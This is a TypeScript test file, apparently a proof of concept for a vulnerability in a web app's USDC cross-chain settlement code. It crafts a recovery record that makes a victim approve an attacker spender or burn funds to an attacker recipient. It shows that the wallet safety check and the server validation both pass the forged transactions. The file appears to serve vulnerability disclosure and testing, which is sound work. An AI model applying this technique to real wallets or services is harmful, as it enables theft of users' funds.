// globals
import { CCTP_CONTRACTS, CCTP_USDC, CctpSettlementProvider } from '../../../../../website/src/swings/settlement/cctp.ts';
import { transactionProblems } from '../../../../../website/src/swings/wallet/safety.ts';
import { cleanRecord } from '../../../../../website/api/_swingsRecords.ts';

const VICTIM = '0x' + 'a'.repeat(40);
const ATTACKER = '0x' + 'e'.repeat(40);
describe('PoC: crafted recovery record', () => {
  it('builds an approve to an attacker spender and a burn to an attacker recipient that pass the gateway check', async () => {
    const p = new CctpSettlementProvider({ mode: 'standard', read: (() => async () => '0x') as never, fetchImpl: (async () => new Response('{}')) as never, now: () => 1000 });
    const quote: any = { providerId: p.id, expiresAt: 10n ** 15n > 0n ? 9e15 : 0, intent: { sourceChain: 'ethereum', sourceAsset: { chain: 'ethereum', address: CCTP_USDC.ethereum }, sourceAmount: 10_000_000_000n, destinationChain: 'base', destinationAsset: { chain: 'base', address: CCTP_USDC.base }, sender: VICTIM, recipient: ATTACKER },
      raw: { mode: 'standard', srcDomain: 0, dstDomain: 6, usdc: CCTP_USDC.ethereum, amount: 10_000_000_000n, maxFee: 0n, minFinalityThreshold: 2000, needsApproval: true, tokenMessenger: ATTACKER } };
    const txs = await p.buildSettlement(quote);
    const allowed = p.allowedDestinations('ethereum');
    const approve = txs[0]!;
    const problems = transactionProblems(approve.unsigned as never, { address: VICTIM } as never, { address: VICTIM, chain: 'ethereum', allowedDestinations: allowed } as never);
    console.log('approve data', (approve.unsigned as any).tx.data, 'problems', problems);
    expect(problems).toEqual([]);
    expect((approve.unsigned as any).tx.data.toLowerCase()).toContain('e'.repeat(40));
    // Same record with the genuine messenger: the burn passes and mints to the attacker.
    quote.raw.tokenMessenger = CCTP_CONTRACTS.tokenMessenger;
    const burn = (await p.buildSettlement(quote)).find((t) => t.stepId === 'burn')!;
    const bp = transactionProblems(burn.unsigned as never, { address: VICTIM } as never, { address: VICTIM, chain: 'ethereum', allowedDestinations: allowed } as never);
    console.log('burn problems', bp, (burn.unsigned as any).tx.data.includes('e'.repeat(40)));
    expect(bp).toEqual([]);
    // The server accepts such a record from anyone.
    const rec = { id: 'attacker_chosen_recovery_code_0001', version: 1, state: 'QUOTED', quote: { ...quote, raw: { ...quote.raw, amount: '10000000000' } }, steps: {}, history: [] };
    console.log('server accepts', cleanRecord('settlement', JSON.parse(JSON.stringify(rec, (_k, v) => typeof v === 'bigint' ? v.toString() : v))).ok);
  });
});
